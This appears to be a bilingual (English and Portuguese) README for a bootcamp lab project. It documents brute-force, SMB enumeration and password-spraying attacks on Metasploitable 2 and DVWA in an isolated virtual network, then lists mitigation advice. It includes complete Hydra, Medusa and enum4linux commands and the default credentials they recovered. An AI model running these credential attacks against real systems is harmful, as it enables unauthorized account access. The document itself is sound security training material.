
# 🔐 Cybersecurity Project – DIO/Santander Bootcamp
![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![Made with](https://img.shields.io/badge/made%20with-Kali%20Linux-red)
![Pentest](https://img.shields.io/badge/type-pentest-critical)
![Bootcamp](https://img.shields.io/badge/bootcamp-DIO%2FSantander-purple)

This project simulates brute-force attacks in a controlled environment using **Kali Linux**, tools like **Hydra**, **Medusa**, **Enum4linux**, and **Smbmap**, targeting vulnerable systems such as **Metasploitable 2** and **DVWA**. The goal is to demonstrate offensive pentesting techniques and propose effective defensive measures.

## 🧰 Tools and Technologies

- Kali Linux (VM)
- Metasploitable 2 (VM)
- DVWA (Damn Vulnerable Web Application)
- Hydra
- Medusa
- Enum4linux
- Smbmap
- Nmap
- VirtualBox (host-only network)

## ⚙️ Environment Setup

- Two virtual machines in VirtualBox:
  - Kali Linux as the attacker
  - Metasploitable 2 as the target
- Internal network configured as **host-only**
- DVWA enabled on Metasploitable via Apache/MySQL

## 🧪 Executed Tests

### 🔓 1. FTP Brute-Force Attack with Hydra

```bash
hydra -l user -P pass.txt -t 4 ftp://192.168.56.101
```

- Wordlist: `pass.txt`
- Result: Successful login using `user:msfadmin`

### 🌐 2. Web Form Brute-Force (DVWA) with Hydra

```bash
hydra -l user -P pass.txt 192.168.56.101 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -t 4 -V
```

- Wordlist: `pass.txt`
- Result: Multiple valid credentials found, including `root:root`, `msfadmin:msfadmin`

### 🧮 3. SMB User Enumeration with Enum4linux

```bash
enum4linux -a 192.168.56.101
```

- Result: Full enumeration of users and SMB shares
- Log: `enum4_output.txt`

### 🔐 4. Password Spraying on SMB with Medusa

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt
```

- Wordlists: `smb_users.txt` + `senhas_spray.txt`
- Result: Successful login with `msfadmin:msfadmin` on `ADMIN$` share
- Log: `ataque_spraying.txt`

## 📂 File Structure

| File                  | Description                                      |
|-----------------------|--------------------------------------------------|
| `pass.txt`            | Wordlist used for FTP and DVWA brute-force       |
| `senhas_spray.txt`    | Password list for SMB spraying                   |
| `smb_users.txt`       | SMB user list                                    |
| `users.txt`           | Usernames for web login brute-force              |
| `enum4_output.txt`    | Enum4linux output with user/share enumeration    |
| `ataque_spraying.txt` | Medusa log showing successful SMB login          |
| `teste1.txt`          | Initial Nmap scan                                |

## 🔐 Mitigation Recommendations

- Implement IP blocking after failed login attempts
- Enforce multi-factor authentication (MFA)
- Apply strong password policies and expiration rules
- Monitor authentication and access logs
- Disable insecure services like FTP

## 🚀 Conclusion

This project demonstrated how tools like Hydra, Medusa, and Enum4linux can be used to simulate attacks on vulnerable systems. The hands-on experience reinforced the importance of preventive measures and the ability to document technical audit processes clearly.

## 📎 References

- [Kali Linux – Official Site](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [Medusa – Documentation](https://tools.kali.org/password-attacks/medusa)
- [Hydra – GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Enum4linux – GitHub](https://github.com/CiscoCXSecurity/enum4linux)

---

# 🔐 Projeto de Cibersegurança – Bootcamp DIO/Santander

Este projeto simula ataques de força bruta em um ambiente controlado utilizando **Kali Linux**, as ferramentas **Hydra**, **Medusa**, **Enum4linux** e **Smbmap**, com os alvos vulneráveis **Metasploitable 2** e **DVWA**. O objetivo é demonstrar técnicas ofensivas de pentest e propor medidas defensivas eficazes.

## 🧰 Tecnologias e Ferramentas Utilizadas

- Kali Linux (VM)
- Metasploitable 2 (VM)
- DVWA (Damn Vulnerable Web Application)
- Hydra
- Medusa
- Enum4linux
- Smbmap
- Nmap
- VirtualBox (rede host-only)

## ⚙️ Configuração do Ambiente

- Duas máquinas virtuais no VirtualBox:
  - Kali Linux como atacante
  - Metasploitable 2 como alvo
- Rede interna configurada como **host-only**
- DVWA ativado no Metasploitable via Apache/MySQL

## 🧪 Testes Realizados

### 🔓 1. Ataque de Força Bruta em FTP com Hydra

```bash
hydra -l user -P pass.txt -t 4 ftp://192.168.56.101
```

- Wordlist: `pass.txt`
- Resultado: Acesso obtido com sucesso usando `user:msfadmin`

### 🌐 2. Ataque Web Automatizado (DVWA) com Hydra

```bash
hydra -l user -P pass.txt 192.168.56.101 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" -t 4 -V
```

- Wordlist: `pass.txt`
- Resultado: Várias credenciais válidas identificadas, incluindo `root:root`, `msfadmin:msfadmin`

### 🧮 3. Enumeração de Usuários com Enum4linux

```bash
enum4linux -a 192.168.56.101
```

- Resultado: Enumeração completa de usuários e shares SMB
- Log: `enum4_output.txt`

### 🔐 4. Password Spraying em SMB com Medusa

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt
```

- Wordlists: `smb_users.txt` + `senhas_spray.txt`
- Resultado: Acesso obtido com `msfadmin:msfadmin` ao share `ADMIN$`
- Log: `ataque_spraying.txt`

## 📂 Organização dos Arquivos

| Arquivo                | Descrição                                      |
|------------------------|-----------------------------------------------|
| `pass.txt`             | Wordlist usada em ataques FTP e DVWA          |
| `senhas_spray.txt`     | Wordlist para password spraying SMB           |
| `smb_users.txt`        | Lista de usuários SMB                         |
| `users.txt`            | Wordlist de usuários para ataques web         |
| `enum4_output.txt`     | Resultado da enumeração SMB                   |
| `ataque_spraying.txt`  | Log do Medusa com sucesso em SMB              |
| `teste1.txt`           | Scan Nmap inicial                             |

## 🔐 Recomendações de Mitigação

- Implementar bloqueio de IP após tentativas falhas
- Habilitar autenticação multifator (MFA)
- Aplicar políticas de senha forte e expiração
- Monitorar logs de autenticação e acesso
- Desabilitar serviços inseguros como FTP

## 🚀 Conclusão

Este projeto demonstrou como ferramentas como Hydra, Medusa e Enum4linux podem ser utilizadas para simular ataques em ambientes vulneráveis. A prática reforçou a importância de medidas preventivas e a capacidade de documentar tecnicamente os processos de auditoria.

## 📎 Referências

- [Kali Linux – Site Oficial](https://www.kali.org/)
- [DVWA – Damn Vulnerable Web Application](http://www.dvwa.co.uk/)
- [Medusa – Documentação](https://tools.kali.org/password-attacks/medusa)
- [Hydra – GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [Enum4linux – GitHub](https://github.com/CiscoCXSecurity/enum4linux)
